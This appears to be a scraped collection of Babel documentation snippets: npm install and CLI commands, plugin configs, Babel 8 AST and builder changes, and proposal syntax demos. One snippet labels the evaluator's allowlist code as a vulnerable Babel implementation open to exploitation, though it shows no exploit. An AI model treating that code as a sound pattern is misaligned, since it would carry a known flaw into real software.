type World = "world";
// `hello ${World}` is a template literal type
type Greeting = `hello ${World}`;

// AST in Babel 7
{
  type: "TSLiteralType",
  literal: {
    type: "TemplateLiteral",
    expressions: [{
      type: "TSTypeReference",
      typeName: Identifier("World")
    }],
    quasis: [
      TemplateElement("hello "),
      TemplateElement("")
    ]
  }
}

// AST in Babel 8
{
  type: "TSTemplateLiteralType",
  types: [{
    type: "TSTypeReference",
    typeName: Identifier("World")
  }],
  quasis: [
    TemplateElement("hello "),
    TemplateElement("")
  ]
}

----------------------------------------

TITLE: Setting Babel rootMode in CLI
DESCRIPTION: Command to set Babel's rootMode to 'upward' when running from CLI in a monorepo subpackage.

LANGUAGE: shell
CODE:
babel --root-mode upward src -d lib

----------------------------------------

TITLE: Babel Parser Configuration Example
DESCRIPTION: Shows how to configure Babel parser plugins after removal of catch-all * option.

LANGUAGE: javascript
CODE:
babelParser.parse(code, {
  plugins: [
    "asyncGenerators",
    "classProperties",
    "decorators",
    "doExpressions",
    "dynamicImport",
    "exportExtensions",
    "flow",
    "functionBind",
    "functionSent",
    "jsx",
    "objectRestSpread",
  ],
});

----------------------------------------

TITLE: Installing Babel CLI and Core with npm
DESCRIPTION: Commands for installing babel-cli globally or babel-core as a dev dependency using npm. These are the new packages replacing the previous 'babel' package.

LANGUAGE: Shell
CODE:
$ npm install --global babel-cli
# or
$ npm install --save-dev babel-core

----------------------------------------

TITLE: Valid Partial Application Usage in JavaScript
DESCRIPTION: Demonstrates valid syntax for partial application in various contexts, including object methods and super calls.

LANGUAGE: JavaScript
CODE:
f(x, ?)           // partial application from left
f(?, x)           // partial application from right
f(?, x, ?)        // partial application for any arg
o.f(x, ?)         // partial application from left
o.f(?, x)         // partial application from right
o.f(?, x, ?)      // partial application for any arg
super.f(?)        // partial application allowed for call on |SuperProperty|

----------------------------------------

TITLE: Installing @babel/eslint-parser Packages
DESCRIPTION: Commands to uninstall the old babel-eslint packages and install the new @babel/eslint-parser packages using npm or yarn.

LANGUAGE: shell
CODE:
npm uninstall babel-eslint babel-eslint-plugin
npm install --save-dev @babel/eslint-parser @babel/eslint-plugin

----------------------------------------

TITLE: TypeScript 4.0 Unknown Type in Catch Clauses
DESCRIPTION: Demonstration of using the 'unknown' type for catch clause variables in TypeScript 4.0, improving type safety in error handling.

LANGUAGE: TypeScript
CODE:
try {
  // ...
} catch (e: unknown) {
  // type error! Error() only accepts string | undefined
  throw new Error(e);

  if (typeof e === "string") {
    // e is a string
    throw new Error(e);
  }
}

----------------------------------------

TITLE: Transforming Module String Names with Babel and CommonJS
DESCRIPTION: This snippet shows how the plugin, when used with @babel/plugin-transform-modules-commonjs, transforms the export statement into CommonJS format.

LANGUAGE: JavaScript
CODE:
const emojis = require("./emojis.js");
Object.defineProperty(exports, "__esModule", {
  value: true,
});

exports["😄"] = emojis.smile;

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Shows how to use the plugin via Babel's command line interface.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-modules-commonjs script.js

----------------------------------------

TITLE: Using @babel/plugin-syntax-numeric-separator via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-numeric-separator plugin with Babel CLI for transforming JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-numeric-separator script.js

----------------------------------------

TITLE: Updating TSEnumDeclaration Builder in Babel 8
DESCRIPTION: The signature of the t.tsEnumDeclaration builder has changed in Babel 8. It now requires a TSEnumBody node as the second argument.

LANGUAGE: javascript
CODE:
// Create `enum ColorType { Red, Green, Blue }`
t.tsEnumDeclaration(
  t.identifier("ColorType"),
-  [
+  t.tsEnumBody([
    t.tsEnumMember(t.identifier("Red")),
    t.tsEnumMember(t.identifier("Green")),
    t.tsEnumMember(t.identifier("Blue"))
-  ],
+  ]),
)

----------------------------------------

TITLE: Configuring babelrcRoots in babel.config.json
DESCRIPTION: Configuration snippet to allow Babel to process .babelrc.json files in subpackages of a monorepo.

LANGUAGE: javascript
CODE:
babelrcRoots: [\n  ".",\n  "packages/*",\n],

----------------------------------------

TITLE: Updating TSMappedType AST in Babel 8
DESCRIPTION: The AST structure for TypeScript mapped types has changed in Babel 8. The typeParameter property is flattened into key and constraint properties.

LANGUAGE: typescript
CODE:
let map1: { [P in string]: number; };

// AST in Babel 7
{
  type: "TSMappedType",
  typeParameter: {
    type: "TypeParameter",
    name: Identifier("P"),
    constraint: TSStringKeyword()
  },
  typeAnnotation: TSNumberKeyword(),
}

// AST in Babel 8
{
  type: "TSMappedType",
  key: Identifier("P"),
  constraint: TSStringKeyword()
  typeAnnotation: TSNumberKeyword(),
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage of the plugin for transforming JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-computed-properties script.js

----------------------------------------

TITLE: Declaring Bindify Decorators Function in JavaScript
DESCRIPTION: Function declaration for bindifyDecorators that takes an array of NodePath objects as input and processes decorator bindings. This represents the main export of the package.

LANGUAGE: javascript
CODE:
declare export default bindifyDecorators(decorators: Array<NodePath>);

----------------------------------------

TITLE: Configuring Babel Plugin in JSON
DESCRIPTION: Demonstrates how to configure the optional chaining assignment plugin in a Babel configuration file. It specifies the plugin name and version option.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-proposal-optional-chaining-assign",
      {
        "version": "2023-07"
      }
    ]
  ]
}

----------------------------------------

TITLE: Demonstrating Inline RegExp Modifiers in JavaScript
DESCRIPTION: Shows examples of using the new inline RegExp modifiers proposal, which allows enabling or disabling flags for parts of a regular expression.

LANGUAGE: JavaScript
CODE:
/(?i:a)a/.test("aa"); // true
/(?i:a)a/.test("Aa"); // true
/(?i:a)a/.test("aA"); // false

----------------------------------------

TITLE: Using code placeholders in @babel/template
DESCRIPTION: Example of using the new code placeholder syntax in @babel/template. This allows inserting arbitrary nodes into template strings when generating code.

LANGUAGE: JavaScript
CODE:
const buildLazyFn = template`
  function %%name%%(%%params%%) {
    return function () %%body%%;
  }
`;

const result = buildLazyFn({
  name: functionName,
  params: functionParams,
  body: functionBody,
});

----------------------------------------

TITLE: Using Babel JSX Syntax Plugin via CLI
DESCRIPTION: Command line usage of the JSX syntax plugin with Babel CLI

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-jsx script.js

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line example for using the logical assignment operators transform plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-logical-assignment-operators script.js

----------------------------------------

TITLE: Using Instance Private Methods in Babel 7.2.0
DESCRIPTION: Support for instance private methods, part of the private methods proposal.

LANGUAGE: JavaScript
CODE:
class Dog {
  #bark() { console.log("Mew!") }
}

----------------------------------------

TITLE: Installing Throw Expressions Plugin via NPM
DESCRIPTION: Command to install the throw expressions Babel plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-throw-expressions

----------------------------------------

TITLE: Babel Version Assertion Plugin Example
DESCRIPTION: Demonstrates how to assert Babel version requirements in plugins using the new assertVersion API.

LANGUAGE: javascript
CODE:
import { declare } from "@babel/helper-plugin-utils";

export default declare(api => {
  api.assertVersion(7);
  // ...
});

----------------------------------------

TITLE: Input Code Example with Comments
DESCRIPTION: Example input code showing a function call with existing comments that will be annotated as pure.

LANGUAGE: javascript
CODE:
const four = /* foo */ add(2, 2);

----------------------------------------

TITLE: Updating TSImportType Builder in Babel 8
DESCRIPTION: The signature of the t.tsImportType builder has changed in Babel 8. It now requires a TSLiteralType node as the first argument.

LANGUAGE: javascript
CODE:
t.tsImportType(
+   t.tsLiteralType(
    t.stringLiteral("foo")
+   )
)

----------------------------------------

TITLE: Using react-display-name Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-react-display-name plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-react-display-name script.js

----------------------------------------

TITLE: Traditional JSX Conditional Rendering
DESCRIPTION: Shows the traditional approach to conditional component rendering in JSX using separate functions.

LANGUAGE: javascript
CODE:
const getColoredComponent = color => {
  if (color === "blue") {
    return <BlueComponent />;
  }
  if (color === "red") {
    return <RedComponent />;
  }
  if (color === "green") {
    return <GreenComponent />;
  }
};

const Component = props => (
  <div className="myComponent">{getColoredComponent()}</div>
);

----------------------------------------

TITLE: Vulnerable Babel Evaluation Logic
DESCRIPTION: Source code showing the vulnerable _evaluate implementation in Babel that allows exploitation through insufficient validation of call expressions and object methods.

LANGUAGE: typescript
CODE:
const VALID_OBJECT_CALLEES = ["Number", "String", "Math"] as const;
const VALID_IDENTIFIER_CALLEES = [
  "isFinite",
  "isNaN",
  "parseFloat",
  "parseInt",
  "decodeURI",
  "decodeURIComponent",
  "encodeURI",
  "encodeURIComponent",
  process.env.BABEL_8_BREAKING ? "btoa" : null,
  process.env.BABEL_8_BREAKING ? "atob" : null,
] as const;

const INVALID_METHODS = ["random"] as const;

----------------------------------------

TITLE: Babel Traverse Sibling Methods
DESCRIPTION: New helper methods added to babel-traverse for working with sibling nodes in the AST.

LANGUAGE: javascript
CODE:
path.getPrevSibling(); // path.getSibling(path.parentPath.key - 1)
path.getNextSibling(); // path.getSibling(path.parentPath.key + 1)
path.getAllPrevSiblings(); // returns Array<NodePath> of previous siblings
path.getAllNextSiblings();// returns Array<NodePath> of next siblings

----------------------------------------

TITLE: Configuring Babel to use import-source syntax plugin
DESCRIPTION: This JSON configuration enables the @babel/plugin-syntax-import-source plugin in a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-import-source"]
}

----------------------------------------

TITLE: Using babel-plugin-transform-inline-environment-variables via CLI
DESCRIPTION: Shows how to use the plugin with Babel's command-line interface to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins transform-inline-environment-variables script.js

----------------------------------------

TITLE: Applying Record and Tuple plugin via Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the Record and Tuple plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: [["@babel/plugin-proposal-record-and-tuple"]],
});

----------------------------------------

TITLE: Module Import Migration for Helper Functions
DESCRIPTION: Example showing migration from babel.hub.file.addImport to @babel/helper-module-imports usage.

LANGUAGE: javascript
CODE:
+  import { addDefault } from "@babel/helper-module-imports";
function importModule(pkgStore, name, path) {
-  return path.hub.file.addImport(resolvePath(pkgStore, name, path), 'default', name);
+  return addDefault(path, resolvePath(pkgStore, name, path), { nameHint: name });
}

----------------------------------------

TITLE: Example Babel Plugin Using isRequired
DESCRIPTION: Example showing how to use isRequired in a Babel plugin to optimize output based on target environment support

LANGUAGE: javascript
CODE:
module.exports = api => {
  const targets = api.targets();
  const optionalChainingSupported = !isRequired(
    "transform-optional-chaining",
    targets
  );
  const visited = new WeakSet();
  return {
    visitor: {
      MemberExpression(path) {
        if (path.matchesPattern("a.b")) {
          if (visited.has(path.node)) return;
          visited.add(path.node);
          if (optionalChainingSupported) {
            path.replaceWith(api.templates`a?.b`);
          } else {
            path.replaceWith(api.templates`a != null && ${path.node}`);
          }
        }
      },
    },
  };
};

----------------------------------------

TITLE: For-Await Statement Implementation
DESCRIPTION: Example of the new for-await syntax that allows iterating over async iterables.

LANGUAGE: JavaScript
CODE:
async function f() {
  for await (let x of y) {
    g(x);
  }
}

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-export-namespace-from"]
}

----------------------------------------

TITLE: Babel Preset Installation Command
DESCRIPTION: NPM/Yarn command to install common Babel presets for environment, React, and stage-2 features.

LANGUAGE: shell
CODE:
npm install babel-preset-env babel-preset-react babel-preset-stage-2 --save-dev

----------------------------------------

TITLE: Installing @babel/plugin-transform-runtime Dependencies
DESCRIPTION: Commands to install the required dependencies for using @babel/plugin-transform-runtime as development and production dependencies.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-runtime

LANGUAGE: shell
CODE:
npm install --save @babel/runtime

----------------------------------------

TITLE: TypeScript Extension Rewriting
DESCRIPTION: Shows how Babel transforms TypeScript file extensions from .ts to .js in both static imports and dynamic import() expressions.

LANGUAGE: typescript
CODE:
// Input
import { hello } from "./dep.ts";
let myVar: number = hello();

// Output
import { hello } from "./dep.js";
let myVar = hello();

LANGUAGE: typescript
CODE:
// Input
await import("./dep.ts");
await import(url);

// Output
await import("./dep.js");
await import(url.replace(/\.ts$/, ".js")); // simplified

----------------------------------------

TITLE: Installing Babel ES2015 Preset Package
DESCRIPTION: Demonstrates how to install the babel-preset-es2015 package using npm, which is a new concept in Babel 6 for grouping similar plugins.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-preset-es2015

----------------------------------------

TITLE: Implementing Babel Export Namespace Plugin via Node API
DESCRIPTION: JavaScript code showing how to enable the export namespace syntax plugin when using Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-export-namespace-from"]
});

----------------------------------------

TITLE: Using block-scoped-functions Plugin via Babel CLI
DESCRIPTION: Shows the command to use the @babel/plugin-transform-block-scoped-functions plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-block-scoped-functions script.js

----------------------------------------

TITLE: Installing @babel/code-frame Package
DESCRIPTION: Instructions for installing the @babel/code-frame package using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/code-frame

----------------------------------------

TITLE: Installing @babel/code-frame Package
DESCRIPTION: Instructions for installing the @babel/code-frame package using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/code-frame

----------------------------------------

TITLE: Installing @babel/plugin-proposal-record-and-tuple via npm
DESCRIPTION: Command to install the Babel plugin for Record and Tuple proposal using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-record-and-tuple

----------------------------------------

TITLE: Babel Configuration with Flow Preset
DESCRIPTION: JSON configuration for enabling the Flow preset in babel.config.json.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-flow"]
}

----------------------------------------

TITLE: Demonstrating Variable Reference Before Declaration
DESCRIPTION: Shows how accessing variables before declaration behaves differently between let and var declarations, illustrating temporal dead zone for let and hoisting for var.

LANGUAGE: javascript
CODE:
function foo() {
  console.log(b); // ReferenceError
  let b = 1;
}

function bar() {
  console.log(a); // a is void 0
  var a = 5;
  console.log(a); // 5
}

----------------------------------------

TITLE: Flow Property Variance Annotations
DESCRIPTION: New support for Flow's property variance annotations feature with + and - modifiers

LANGUAGE: javascript
CODE:
type T = { +p: T };
interface T { -p: T };
declare class T { +[k:K]: V };
class T { -[k:K]: V };
class C2 { +p: T = e };

----------------------------------------

TITLE: Configuring @babel/plugin-transform-runtime Version
DESCRIPTION: JSON configuration showing how to specify a particular version of @babel/runtime to use with the plugin.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-transform-runtime", {
      "version": "^7.24.0"
    }]
  ]
}

----------------------------------------

TITLE: Installing Babel V8 Spread Parameters Bugfix Plugin
DESCRIPTION: Command to install the Babel plugin via npm package manager

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining

----------------------------------------

TITLE: Installing Babel and Grunt-Babel using npm
DESCRIPTION: This command installs @babel/core and grunt-babel as development dependencies. It allows the use of Babel with Grunt for transpiling JavaScript code in a project's build process.

LANGUAGE: shell
CODE:
npm install --save-dev grunt-babel @babel/core

----------------------------------------

TITLE: Configuring JSON Modules Support
DESCRIPTION: Configuration for enabling JSON modules support in Babel with specific browser and Node.js targets.

LANGUAGE: json
CODE:
{
  "targets": ["chrome 90", "firefox 90", "node 20.6"],
  "plugins": ["@babel/plugin-proposal-json-modules"]
}

----------------------------------------

TITLE: Using @babel/plugin-syntax-export-default-from via CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-export-default-from plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-export-default-from script.js

----------------------------------------

TITLE: Implementing Babel JSX Syntax Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the JSX syntax plugin with Babel's Node API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-jsx"],
});

----------------------------------------

TITLE: Using Babel Plugin for WebAssembly Import via CLI
DESCRIPTION: Shows the command to use the @babel/plugin-proposal-import-wasm-source plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins=@babel/plugin-proposal-import-wasm-source script.js

----------------------------------------

TITLE: Basic Babel Configuration
DESCRIPTION: Simple configuration to enable the regenerator transform plugin without any options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-regenerator"]
}

----------------------------------------

TITLE: Babel Helper Hoist Variables API TypeScript Definition
DESCRIPTION: TypeScript type definitions for the hoistVariables function and EmitFunction callback. The API allows for variable hoisting with customizable emission handling.

LANGUAGE: typescript
CODE:
type EmitFunction = (
  id: t.Identifier,
  idName: string,
  hasInit: boolean,
) => any;

declare export default hoistVariables(path: NodePath, emit: EmitFunction, kind: "var" | "let" = "var");

----------------------------------------

TITLE: Clearing Traverse Cache in JavaScript
DESCRIPTION: Shows how to use the new clearCache API to clear path and scope caches in the Babel traverse module.

LANGUAGE: JavaScript
CODE:
traverse.clearCache(); // clears both path's and scope cache
traverse.clearCache.clearPath();
traverse.clearCache.clearScope();

----------------------------------------

TITLE: Basic Babel Configuration
DESCRIPTION: Basic configuration to enable the private methods transform plugin without options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-private-methods"]
}

----------------------------------------

TITLE: Creating an ArrayExpression Node
DESCRIPTION: Example of creating an ArrayExpression node using the t.arrayExpression(elements) builder function.

LANGUAGE: JavaScript
CODE:
t.arrayExpression(elements);

----------------------------------------

TITLE: Using Firefox Class Bugfix Plugin via CLI
DESCRIPTION: Command line instruction to use the plugin with Babel CLI

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-bugfix-firefox-class-in-computed-class-key script.js

----------------------------------------

TITLE: Installing Karma Babel Dependencies
DESCRIPTION: Installs the Karma Babel preprocessor and Babel core packages as development dependencies. These packages allow Karma to process JavaScript files through Babel before running tests.

LANGUAGE: shell
CODE:
npm install --save-dev karma-babel-preprocessor @babel/core

----------------------------------------

TITLE: Configuring Babel for Updated Decorators
DESCRIPTION: Shows how to configure Babel to use the latest version of the decorators proposal by setting the version option.

LANGUAGE: JSON
CODE:
{
  "presets": ["@babel/preset-env"],
  "plugins": [
    ["@babel/plugin-proposal-decorators", { "version": "2023-01" }]
  ]
}

----------------------------------------

TITLE: Configuring @babel/plugin-syntax-dynamic-import in Babel config
DESCRIPTION: JSON configuration to add the @babel/plugin-syntax-dynamic-import plugin to the Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-dynamic-import"]
}

----------------------------------------

TITLE: Applying syntax-import-defer plugin using Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-import-defer plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-import-defer"]
});

----------------------------------------

TITLE: Promise Polyfill Example - With Runtime
DESCRIPTION: Transformed Promise code using @babel/runtime-corejs2's core-js implementation

LANGUAGE: javascript
CODE:
var _Promise = require("@babel/runtime-corejs2/core-js/promise.js");

----------------------------------------

TITLE: Using proto-to-assign Plugin via Babel CLI
DESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-proto-to-assign plugin with the Babel CLI.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-proto-to-assign script.js

----------------------------------------

TITLE: CLI Usage with Nested Options
DESCRIPTION: Example of using babel-minify CLI with nested configuration options for mangling, dead code elimination, and output file specification.

LANGUAGE: shell
CODE:
minify input.js --mangle.keepClassName --deadcode.keepFnArgs --outFile input.min.js

----------------------------------------

TITLE: Optimized polyfill imports
DESCRIPTION: Example of optimized polyfill imports generated by babel-preset-env.

LANGUAGE: JavaScript
CODE:
import "core-js/modules/es7.string.pad-start";
import "core-js/modules/es7.string.pad-end";

----------------------------------------

TITLE: Configuring Babel in Duo using Node.js API
DESCRIPTION: This code demonstrates how to configure Duo with Babel using the Node.js API. It shows the process of creating a Duo instance, setting the entry point, using the Babel plugin, and running the build process.

LANGUAGE: javascript
CODE:
Duo(root)
  .entry(entry)
  .use(babel)
  .run(fn);

----------------------------------------

TITLE: Installing babel-helper-remove-or-void via npm or yarn
DESCRIPTION: This command installs the babel-helper-remove-or-void package as a development dependency using either npm or yarn package managers.

LANGUAGE: shell
CODE:
npm install babel-helper-remove-or-void --save-dev

----------------------------------------

TITLE: Integrating Metalsmith Babel Plugin via API
DESCRIPTION: This code demonstrates how to programmatically integrate the metalsmith-babel plugin using the Metalsmith API. It includes setting up Metalsmith, applying the babel plugin with options, and handling the build process with error checking.

LANGUAGE: JavaScript
CODE:
var Metalsmith = require("metalsmith");
var babel = require("metalsmith-babel");

new Metalsmith("./source")
  .use(babel({
    /* babel options */
    presets: ["@babel/preset-env"]
  }))
  .build(function(err, files) {
    if (err) {
      throw err;
    }

    console.log("Completed.");
  });

----------------------------------------

TITLE: Demonstrating TypeScript 4.9 'satisfies' Operator
DESCRIPTION: This snippet shows the usage of the new 'satisfies' operator in TypeScript 4.9, which allows type assertion without casting. It demonstrates type checking and error detection.

LANGUAGE: typescript
CODE:
let a = { x: 1, y: 2 } as const;
//  ^ type is { x: 1, y: 2 }

let b = a satisfies { [key: string]: number };
//  ^ type is still { x: 1, y: 2 }, and not { [key: string]: number }!

a satisfies { [key: string]: string };
// error! a does not satisfies that type

----------------------------------------

TITLE: Applying class static block syntax plugin with Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-class-static-block plugin programmatically with Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-class-static-block"],
});

----------------------------------------

TITLE: Applying Babel plugin via Node.js API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-destructuring-private plugin with Babel's Node.js API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-destructuring-private"],
});

----------------------------------------

TITLE: Installing @babel/plugin-proposal-async-do-expressions via npm
DESCRIPTION: This command installs the Babel plugin for async do expressions as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-proposal-async-do-expressions

----------------------------------------

TITLE: Implementing Throw Expressions via Node API
DESCRIPTION: JavaScript code showing how to use the throw expressions plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-throw-expressions"],
});

----------------------------------------

TITLE: Using REPL with Input History
DESCRIPTION: Commands to use babel-node REPL with input history support using rlwrap

LANGUAGE: shell
CODE:
rlwrap npx babel-node

LANGUAGE: shell
CODE:
NODE_NO_READLINE=1 rlwrap --always-readline npx babel-node

----------------------------------------

TITLE: Using Stage Presets in Babel v6 Configuration
DESCRIPTION: An example of how Stage presets were commonly used in Babel v6 configurations. This snippet shows including ES2015, React, and Stage 0 presets.

LANGUAGE: JavaScript
CODE:
{
  "presets": ["es2015", "react", "stage-0"]
}

----------------------------------------

TITLE: Applying Object.assign Transform via Babel Node API
DESCRIPTION: JavaScript code to use the plugin programmatically with Babel's Node API for code transformation.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-object-assign"],
});

----------------------------------------

TITLE: Configuring Babel Register Ignore Patterns
DESCRIPTION: Example showing how to override the default node_modules ignore behavior

LANGUAGE: javascript
CODE:
require("@babel/register")({\n  // This will override `node_modules` ignoring - you can alternatively pass\n  // an array of strings to be explicitly matched or a regex / glob\n  ignore: [],\n});

----------------------------------------

TITLE: Installing babel-helper-mark-eval-scopes Package
DESCRIPTION: Command to install the babel-helper-mark-eval-scopes package as a development dependency using npm package manager.

LANGUAGE: shell
CODE:
npm install babel-helper-mark-eval-scopes --save-dev

----------------------------------------

TITLE: Using Babel Transpiler in Ruby
DESCRIPTION: Shows how to use the Babel transpiler to transform ES6 JavaScript code using Ruby. The code reads an ES6 file and transforms it using the Babel transpiler.

LANGUAGE: ruby
CODE:
require 'babel/transpiler'
Babel::Transpiler.transform File.read("foo.es6")

----------------------------------------

TITLE: Installing Babel Development Dependencies with NPM/Yarn
DESCRIPTION: Command to install three Babel-related development packages: requirejs-babel for RequireJS integration, @babel/standalone for browser-based Babel transformation, and babel-plugin-module-resolver-standalone for module resolution.

LANGUAGE: shell
CODE:
npm install --save-dev requirejs-babel @babel/standalone babel-plugin-module-resolver-standalone

----------------------------------------

TITLE: Installing @babel/plugin-syntax-class-static-block via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-class-static-block plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-class-static-block

----------------------------------------

TITLE: Implementing Babel Plugin via Node.js API
DESCRIPTION: JavaScript code showing how to use the nullish coalescing operator syntax plugin with Babel's Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-nullish-coalescing-operator"]
});

----------------------------------------

TITLE: Disabling Runtime Wrapper for Regular Expressions in JavaScript
DESCRIPTION: This snippet shows the behavior when the 'runtime' option is set to false, demonstrating that internal group references work but runtime properties are undefined.

LANGUAGE: JavaScript
CODE:
var stringRe = /(?:(?<quote>")|(?<quote>')).*?\k<quote>/;

stringRe.test("'foo'"); // "true", works
stringRe.exec("'foo'").groups.quote; // undefined

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: Example of using the minify-replace plugin programmatically through the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-replace"]
});

----------------------------------------

TITLE: Using Throw Expressions Plugin via CLI
DESCRIPTION: Command line interface usage for the throw expressions Babel plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-proposal-throw-expressions script.js

----------------------------------------

TITLE: Installing babel-plugin-minify-mangle-names via npm
DESCRIPTION: This command installs the babel-plugin-minify-mangle-names plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install babel-plugin-minify-mangle-names --save-dev

----------------------------------------

TITLE: Demonstrating Edge 16 Arrow Function Parameter Bug
DESCRIPTION: Shows code patterns that trigger a parsing bug in Edge 16 browser related to shorthand destructured parameters with default values in arrow functions.

LANGUAGE: javascript
CODE:
// this breaks in Edge 16:
const foo = ({ a = 1 }) => {};

// .. but this doesn't:
function foo({ a = 1, b }, ...args) {}

// ... and neither does this:
const foo = ({ a: a = 1 }) => {};

----------------------------------------

TITLE: Exporting Namespace in JavaScript Modules
DESCRIPTION: Example of the export namespace syntax, now supported by Babel's preset-env for ECMAScript 2020 compatibility.

LANGUAGE: JavaScript
CODE:
export * as ns from "mod";

----------------------------------------

TITLE: Demonstrating Variable Hoisting in Conditional Blocks
DESCRIPTION: Illustrates how var declarations in conditional blocks affect variable accessibility due to hoisting, making value determination challenging at compile time.

LANGUAGE: javascript
CODE:
function foo() {
  if (a) var x = 5;
  console.log(x); // cannot determine
}

----------------------------------------

TITLE: Installing Import Attributes Plugin via NPM/Yarn
DESCRIPTION: Command to install the @babel/plugin-proposal-import-attributes-to-assertions plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-import-attributes-to-assertions

----------------------------------------

TITLE: Installing babel-node-debug Globally
DESCRIPTION: A command to globally install the babel-node-debug package using npm. The -g flag ensures the package is installed system-wide rather than in a local project.

LANGUAGE: shell
CODE:
npm install -g babel-node-debug

----------------------------------------

TITLE: Migrating Pipeline Operator Configuration in Babel v7
DESCRIPTION: An example of how to update the configuration for the pipeline operator proposal in Babel v7, demonstrating the new approach of explicitly specifying the proposal variant.

LANGUAGE: JavaScript
CODE:
{
  "plugins": [
-   "@babel/plugin-proposal-pipeline-operator"
+   ["@babel/plugin-proposal-pipeline-operator", { "proposal": "minimal" }]
  ]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line interface usage for applying the transformation to a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins transform-simplify-comparison-operators script.js

----------------------------------------

TITLE: Output Code After Minify Replace
DESCRIPTION: Resulting code after the minify-replace plugin processes the input, showing the __DEV__ identifier replaced with 0.

LANGUAGE: javascript
CODE:
if (!0) {
  foo();
}
if (a.__DEV__) {
  foo();
}

----------------------------------------

TITLE: Transforming Code with Async Do Expressions via Node API
DESCRIPTION: This JavaScript code shows how to use the Babel Core API to transform code with the async do expressions plugin programmatically.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-async-do-expressions"],
});

----------------------------------------

TITLE: Type Constructor Minification Example Output
DESCRIPTION: Minified output showing the optimized equivalents of type constructor calls.

LANGUAGE: javascript
CODE:
!!x;
+x;
x + "";
[,,,];
[3, 1];
{foo: 'bar'};

----------------------------------------

TITLE: Using Numeric Separators in JavaScript
DESCRIPTION: Demonstration of numeric separators, a new ECMAScript 2021 feature allowing underscores for visual separation in numeric literals.

LANGUAGE: JavaScript
CODE:
1_000_000_000
0.000_000_000_1

----------------------------------------

TITLE: Using Async Do Expressions in Babel 7.14.0
DESCRIPTION: Support for the async do expressions proposal.

LANGUAGE: JavaScript
CODE:
let valP = async do {
  2 + await computeIt();
};

